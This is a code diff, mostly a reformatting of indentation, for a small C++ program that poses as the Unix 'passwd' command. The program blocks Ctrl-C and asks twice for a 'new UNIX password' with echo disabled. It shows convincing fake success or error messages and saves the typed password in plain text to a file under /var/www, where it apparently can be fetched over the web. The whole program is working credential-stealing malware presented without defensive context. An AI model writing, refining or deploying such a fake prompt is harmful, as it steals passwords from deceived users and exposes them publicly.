@@ -8,37 +8,38 @@ void ignore_sigint (int sig_no){
 }
 
 using namespace std;
+
 int main (){
-  string cuser;
-  string newpass;
-  string newpass2;
-  ofstream outfile;
+	string cuser;
+	string newpass;
+	string newpass2;
+	ofstream outfile;
 
-  void (*prev_fn)(int);
-  prev_fn = signal (SIGINT,ignore_sigint);
-  
-  cout << "Enter new UNIX password: ";
-  system("stty -echo"); 
-  cin >> newpass;
-  system("stty echo"); 
-  cout << endl;
-  cout << "Retype new UNIX password: ";
-  system("stty -echo"); 
-  cin >> newpass2; 
-  system("stty echo"); 
-  cout << endl;
+	void (*prev_fn)(int);
+	prev_fn = signal (SIGINT,ignore_sigint);
 
-  if (newpass.compare(newpass2) != 0){
-    cout << "Sorry, passwords do not match\n";
-    cout << "passwd: Authentication token manipulation error\n";
-    cout << "passwd: password unchanged";
-  } else {
-    cout << "passwd: password updated successfully\n";
-  }  
+	cout << "Enter new UNIX password: ";
+	system("stty -echo"); 
+	cin >> newpass;
+	system("stty echo"); 
+	cout << endl;
+	cout << "Retype new UNIX password: ";
+	system("stty -echo"); 
+	cin >> newpass2; 
+	system("stty echo"); 
+	cout << endl;
 
-  outfile.open ("/var/www/pass_scheme.txt");
-  outfile << newpass << endl;
-  outfile.close();
-  return 0;
+	if (newpass.compare(newpass2) != 0){
+		cout << "Sorry, passwords do not match\n";
+		cout << "passwd: Authentication token manipulation error\n";
+		cout << "passwd: password unchanged\n";
+	} else {
+		cout << "passwd: password updated successfully\n";
+	}  
+
+	outfile.open ("/var/www/pass_scheme.txt");
+	outfile << newpass << endl;
+	outfile.close();
+	return 0;
 }
 
